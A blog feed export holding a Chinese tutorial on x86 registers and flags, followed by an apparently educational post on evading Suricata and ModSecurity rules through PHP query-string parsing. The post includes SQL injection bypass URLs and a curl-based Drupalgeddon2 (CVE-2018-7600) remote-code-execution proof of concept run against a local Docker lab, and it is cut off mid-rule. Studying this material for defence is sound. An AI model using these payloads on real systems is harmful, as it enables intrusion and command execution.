        <content type="html"><![CDATA[<h2 id="32位CPU所含有的寄存器有："><a href="#32位CPU所含有的寄存器有：" class="headerlink" title="32位CPU所含有的寄存器有："></a>32位CPU所含有的寄存器有：</h2><ol><li>4个数据寄存器(EAX、EBX、ECX和EDX) </li><li>2个变址和指针寄存器(ESI和EDI) </li><li>2个指针寄存器(ESP和EBP)  </li><li>6个段寄存器(ES、CS、SS、DS、FS和GS) </li><li>1个指令指针寄存器(EIP) 1个标志寄存器(EFlags)</li></ol><h1 id="1、数据寄存器"><a href="#1、数据寄存器" class="headerlink" title="1、数据寄存器"></a>1、数据寄存器</h1><p>数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。 </p><ul><li><p>32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。 </p></li><li><p>对低16位数据的存取，不会影响高16位的数据。 这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。 </p></li><li><p>4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。 程序员可利用数据寄存器的这种“可分可合”的特性，灵活地处理字/字节的信息。  </p></li><li><p>寄存器EAX通常称为累加器(Accumulator)，用累加器进行的操作可能需要更少时间。可用于乘、 除、输入/输出等操作，使用频率很高；  </p></li><li><p>寄存器EBX称为基地址寄存器(Base Register)。它可作为存储器指针来使用；  </p></li><li><p>寄存器ECX称为计数寄存器(Count Register)。 在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；  </p></li><li><p>寄存器EDX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址。</p></li></ul><p>在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址， </p><p>在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果， 而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。 </p><h1 id="2、变址寄存器"><a href="#2、变址寄存器" class="headerlink" title="2、变址寄存器"></a>2、变址寄存器</h1><p>32位CPU有2个32位通用寄存器ESI和EDI。 </p><p>其低16位对应先前CPU中的SI和DI，对低16位数据的存取，不影响高16位的数据。 </p><p>寄存器ESI、EDI、SI和DI称为变址寄存器(Index Register)，它们主要用于存放存储单元在段内的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p><p>变址寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p><p>它们可作一般的存储器指针使用。在字符串操作指令的执行过程中，对它们有特定的要求，而且还具有特殊的功能。 </p><h1 id="3、指针寄存器"><a href="#3、指针寄存器" class="headerlink" title="3、指针寄存器"></a>3、指针寄存器</h1><p>其低16位对应先前CPU中的BP和SP，对低16位数据的存取，不影响高16位的数据。 </p><p>32位CPU有2个32位通用寄存器EBP和ESP。 </p><p>它们主要用于访问堆栈内的存储单元，并且规定： </p><ul><li>EBP为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据；  </li><li>ESP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。</li></ul><p>寄存器EBP、ESP、BP和SP称为指针寄存器(Pointer Register)，主要用于存放堆栈内存储单元的偏移量， 用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。 </p><p>指针寄存器不可分割成8位寄存器。作为通用寄存器，也可存储算术逻辑运算的操作数和运算结果。 </p><h1 id="4、段寄存器"><a href="#4、段寄存器" class="headerlink" title="4、段寄存器"></a>4、段寄存器</h1><p>段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。 </p><p>CPU内部的段寄存器： </p><ol><li>ECS——代码段寄存器(Code Segment Register)，其值为代码段的段值；  </li><li>EDS——数据段寄存器(Data Segment Register)，其值为数据段的段值；  </li><li>EES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li><li>ESS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值；  </li><li>EFS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值；  </li><li>EGS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值。  </li><li></li></ol><ul><li>在16位CPU系统中，它只有4个段寄存器，所以，程序在任何时刻至多有4个正在使用的段可直接访问；</li><li>在32位微机系统中，它有6个段寄存器，所以，在此环境下开发的程序最多可同时访问6个段。</li></ul><p>32位CPU有两个不同的工作方式：实方式和保护方式。在每种方式下，段寄存器的作用是不同的。有关规定简 单描述如下： </p><ul><li><p>实方式： 前4个段寄存器CS、DS、ES和SS与先前CPU中的所对应的段寄存器的含义完全一致，内存单元的逻辑地址仍为“段值：偏移量”的形式。为访问某内存段内的数据，必须使用该段寄存器和存储单元的偏移量。  </p></li><li><p>保护方式： 在此方式下，情况要复杂得多，装入段寄存器的不再是段值，而是称为“选择子”(Selector)的某个值。</p></li></ul><h1 id="5、指令指针寄存器"><a href="#5、指令指针寄存器" class="headerlink" title="5、指令指针寄存器"></a>5、指令指针寄存器</h1><p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。 </p><p>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。 </p><p>在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况。 </p><p>所以，在理解它们的功能时，不考虑存在指令队列的情况。 </p><h1 id="6、标志寄存器"><a href="#6、标志寄存器" class="headerlink" title="6、标志寄存器"></a>6、标志寄存器</h1><h2 id="一、运算结果标志位"><a href="#一、运算结果标志位" class="headerlink" title="一、运算结果标志位"></a>一、运算结果标志位</h2><h3 id="1、进位标志CF-Carry-Flag"><a href="#1、进位标志CF-Carry-Flag" class="headerlink" title="1、进位标志CF(Carry Flag)"></a>1、进位标志CF(Carry Flag)</h3><p>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 </p><p>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。 </p><h3 id="2、奇偶标志PF-Parity-Flag"><a href="#2、奇偶标志PF-Parity-Flag" class="headerlink" title="2、奇偶标志PF(Parity Flag)"></a>2、奇偶标志PF(Parity Flag)</h3><p>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 </p><p>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。 </p><h3 id="3、辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3、辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3、辅助进位标志AF(Auxiliary Carry Flag)"></a>3、辅助进位标志AF(Auxiliary Carry Flag)</h3><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： </p><ol><li>在字操作时，发生低字节向高字节进位或借位时； </li><li>在字节操作时，发生低4位向高4位进位或借位时。</li></ol><p>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。 </p><h3 id="4、零标志ZF-Zero-Flag"><a href="#4、零标志ZF-Zero-Flag" class="headerlink" title="4、零标志ZF(Zero Flag)"></a>4、零标志ZF(Zero Flag)</h3><p>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 </p><h3 id="5、符号标志SF-Sign-Flag"><a href="#5、符号标志SF-Sign-Flag" class="headerlink" title="5、符号标志SF(Sign Flag)"></a>5、符号标志SF(Sign Flag)</h3><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。 </p><h3 id="6、溢出标志OF-Overflow-Flag"><a href="#6、溢出标志OF-Overflow-Flag" class="headerlink" title="6、溢出标志OF(Overflow Flag)"></a>6、溢出标志OF(Overflow Flag)</h3><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 “</p><p>溢出”和“进位”是两个不同含义的概念，不要混淆。</p><h2 id="二、状态控制标志位"><a href="#二、状态控制标志位" class="headerlink" title="二、状态控制标志位"></a>二、状态控制标志位</h2><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。 </p><h2 id="1、追踪标志TF-Trap-Flag"><a href="#1、追踪标志TF-Trap-Flag" class="headerlink" title="1、追踪标志TF(Trap Flag)"></a>1、追踪标志TF(Trap Flag)</h2><p>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。 </p><h3 id="2、中断允许标志IF-Interrupt-enable-Flag"><a href="#2、中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="2、中断允许标志IF(Interrupt-enable Flag)"></a>2、中断允许标志IF(Interrupt-enable Flag)</h3><p>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。 但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。 具体规定如下： </p><ol><li>当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； </li><li>当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。 CPU的指令系统中也有专门的指令来改变标志位IF的值。</li></ol><h3 id="3、方向标志DF-Direction-Flag"><a href="#3、方向标志DF-Direction-Flag" class="headerlink" title="3、方向标志DF(Direction Flag)"></a>3、方向标志DF(Direction Flag)</h3><p>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。 在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。 </p><h2 id="三、32位标志寄存器增加的标志位"><a href="#三、32位标志寄存器增加的标志位" class="headerlink" title="三、32位标志寄存器增加的标志位"></a>三、32位标志寄存器增加的标志位</h2><h3 id="1、I-O特权标志IOPL-I-O-Privilege-Level"><a href="#1、I-O特权标志IOPL-I-O-Privilege-Level" class="headerlink" title="1、I/O特权标志IOPL(I/O Privilege Level)"></a>1、I/O特权标志IOPL(I/O Privilege Level)</h3><p>I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。 如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。 </p><h3 id="2、嵌套任务标志NT-Nested-Task"><a href="#2、嵌套任务标志NT-Nested-Task" class="headerlink" title="2、嵌套任务标志NT(Nested Task)"></a>2、嵌套任务标志NT(Nested Task)</h3><p>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下： </p><ol><li>当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作； </li><li>当NT=1，通过任务转换实现中断返回。</li></ol><h3 id="3、重启动标志RF-Restart-Flag"><a href="#3、重启动标志RF-Restart-Flag" class="headerlink" title="3、重启动标志RF(Restart Flag)"></a>3、重启动标志RF(Restart Flag)</h3><p>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。 在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。 </p><h3 id="4、虚拟8086方式标志VM-Virtual-8086-Mode"><a href="#4、虚拟8086方式标志VM-Virtual-8086-Mode" class="headerlink" title="4、虚拟8086方式标志VM(Virtual 8086 Mode)"></a>4、虚拟8086方式标志VM(Virtual 8086 Mode)</h3><p>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态。 </p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用PHP的字符串解析特性Bypass</title>
      <link href="/2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/"/>
      <url>/2020/09/05/php-de-zi-fu-chuan-jie-xi-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="利用PHP的字符串解析特性Bypass"><a href="#利用PHP的字符串解析特性Bypass" class="headerlink" title="利用PHP的字符串解析特性Bypass"></a>利用PHP的字符串解析特性Bypass</h2><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>news<span class="token operator">.</span>php<span class="token operator">?</span><span class="token operator">%</span><span class="token number">20</span>news<span class="token punctuation">[</span>id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">42</span>"<span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符</li><li>将某些字符转换为下划线（包括空格）</li></ol><p>例如：</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>通过以下这个示例，你可以更直观的看到parser_str函数如何处理字符串：</p><p><img src="https://images.dadream.eu.org/images/2024/07/5798f7848e611281e6c1f5f177274f2d.gif"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>            <span class="token string double-quoted-string">"{chr}foo_bar"</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"foo{chr}bar"</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"foo_bar{chr}"</span>        <span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">255</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token variable">$arg</span><span class="token operator">.</span><span class="token string double-quoted-string">"] check "</span><span class="token operator">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"{chr}"</span><span class="token punctuation">,</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"=bla"</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/* yes... I've added a sleep time on each loop just for                 the scenic effect :) like that movie with unrealistic                 brute-force where the password are obtained                 one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ                 */</span>                <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"foo_bar"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token operator">.</span><span class="token string double-quoted-string">" -&gt; "</span><span class="token operator">.</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" ("</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")\n"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\033[999D\033[K\r"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/c9fd7b32696057612ca576d9e3865367.gif"></p><p>parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下：</p><ol><li><p>[1st]foo_bar  </p></li><li><p>foo[2nd]bar    </p></li><li><p>foo_bar[3rd]</p></li></ol><p><img src="https://images.dadream.eu.org/images/2024/07/cb5d1e278e3c9688a9a9d41a0f86cf44.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/9d2b296c2d5660562286b3bcfccb8c0c.png"></p><p>在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。</p><h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h2><p>也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。</p><p>在Suricata中你可以自定义一个HTTP流量的检测规则。假设你有这样一个规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>    msg: <span class="token string">"Block SQLi"</span><span class="token punctuation">;</span> flow:established,to_server<span class="token punctuation">;</span><span class="token punctuation">\</span>    content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span><span class="token punctuation">\</span>    pcre: <span class="token string">"/news_id=[^0-9]+/Pi"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>    sid:1234567<span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说，上述规则会检查news_id的值是否是数字。那么根据上述知识，我们可以很容易的绕过防御，如下所示：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>news<span class="token punctuation">[</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token string single-quoted-string">'/?news%5bid=1%22+AND+1=1--'</span><span class="token operator">/</span><span class="token operator">?</span>news_id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过在Google和Github上进行搜索，我发现有很多关于Suricata规则可以通过替换下划线或插入空字符来绕过。一个真实的例子：<a href="https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805">https://github.com/OISF/suricata-update/blob/7797d6ab0c00051ce4be5ee7ee4120e81f1138b4/tests/emerging-current_events.rules#L805</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http <span class="token variable">$HOME_NET</span> any -<span class="token operator">&gt;</span> <span class="token variable">$EXTERNAL_NET</span> any <span class="token punctuation">(</span>msg:<span class="token string">"ET CURRENT_EVENTS Sakura exploit kit exploit download request /view.php"</span><span class="token punctuation">;</span> flow:established,to_server<span class="token punctuation">;</span> content:<span class="token string">"/view.php?i="</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span> fast_pattern:only<span class="token punctuation">;</span> pcre:<span class="token string">"//view.php?i=\d&amp;key=[0-9a-f]{32}$/U"</span><span class="token punctuation">;</span> classtype:trojan-activity<span class="token punctuation">;</span> sid:2015678<span class="token punctuation">;</span> rev:2<span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述规则可以通过以下方式绕过：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>i<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">20</span>key<span class="token operator">=</span>d3b07384d113edec49eaa6238ad5ff00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然，这条规则交换参数位置即可绕过，比如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>key<span class="token operator">=</span>d3b07384d113edec49eaa6238ad5ff00<span class="token operator">&amp;</span>i<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="WAF（ModSecurity）"><a href="#WAF（ModSecurity）" class="headerlink" title="WAF（ModSecurity）"></a>WAF（ModSecurity）</h2><p>此外，PHP查询字符串的解析特性也可用以绕过WAF。想象一下,它的规则类似于SecRule !ARGS:news_id “@rx ^[0-9]+$” “block”，这显然可以通过相同的手段绕过。幸运的是，在ModSecurity中，可以通过正则表达式指定查询字符串中的参数。比如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SecRule <span class="token operator">!</span>ARGS:/news.id/ <span class="token string">"@rx ^[0-9]+$"</span> <span class="token string">"block"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上规则将拦截诸如以下的请求：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">⛔️<span class="token operator">/</span><span class="token operator">?</span>news<span class="token punctuation">[</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token string single-quoted-string">'⛔️/?news%5bid=1%22+AND+1=1--'</span>⛔️<span class="token operator">/</span><span class="token operator">?</span>news_id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PoC-GTFO"><a href="#PoC-GTFO" class="headerlink" title="PoC || GTFO"></a>PoC || GTFO</h2><p>让我们用Suricata和Drupal CMS创建一个以利用<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a>（Drupalgeddon2远程执行代码）的简单PoC。为了简单起见，我将在两个Docker容器上运行Suricata和Drupal，并尝试绕过Suricata攻击Drupal。</p><p>我将使用两条Suricata防御规则：</p><blockquote><p>​    1.一条自定义规则拦截form_id=user_register_form</p><p>​    2.另一条是关于CVE-2018-7600的通用<a href="https://github.com/ptresearch/AttackDetection/tree/master/CVE-2018-7600">规则</a></p></blockquote><p><img src="https://images.dadream.eu.org/images/2024/07/cc9ac9b3e53320676b53e420344bc456.png"></p><p>Suricata官方安装流程点击<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Ubuntu_Installation_-_Personal_Package_Archives_(PPA)%E3%80%82%E5%AF%B9%E4%BA%8EDrupal%EF%BC%8C%E6%88%91%E8%BF%90%E8%A1%8C%E4%BA%86%E4%B8%80%E4%B8%AAVulhub%E5%AE%B9%E5%99%A8%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8[%E8%BF%99%E9%87%8C](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600">这里</a>下载：</p><p><img src="https://images.dadream.eu.org/images/2024/07/6c573ef2f8b4e325647d74fcc42b6f56.png"></p><p>首先，让我们尝试利用CVE-2018-7600。一个利用curl命令的小型bash脚本，比如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">URL</span><span class="token operator">=</span><span class="token string">"/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax"</span><span class="token assign-left variable">QSTRING</span><span class="token operator">=</span><span class="token string">"form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]="</span><span class="token assign-left variable">COMMAND</span><span class="token operator">=</span><span class="token string">"id"</span><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">${QSTRING}</span><span class="token variable">${COMMAND}</span>"</span> <span class="token string">"http://172.17.0.1:8080<span class="token variable">$URL</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如你所见，上面的脚本将执行命令id：</p><p><img src="https://images.dadream.eu.org/images/2024/07/8c1d64c33993b4c3521b753bb4092268.png"></p><p>现在，让我们尝试往Suricata导入以下两条规则：我编写了第一个规则，它只是尝试form_id=user_register_form在请求体内进行匹配; Positive Technology /user/register在请求URL和#post_render请求正文中写了第二个匹配项。我的规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>  msg: <span class="token string">"Possible Drupalgeddon2 attack"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  flow: established, to_server<span class="token punctuation">;</span><span class="token punctuation">\</span>  content: <span class="token string">"/user/register"</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span><span class="token punctuation">\</span>  content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span><span class="token punctuation">\</span>  pcre: <span class="token string">"/form_id=user_register_form/Pi"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  sid: <span class="token number">10002807</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  rev: <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通用规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>  msg: <span class="token string">"ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600)"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  flow: established, to_server<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"/user/register"</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"drupal"</span><span class="token punctuation">;</span> http_client_body<span class="token punctuation">;</span> <span class="token punctuation">\</span>  pcre: <span class="token 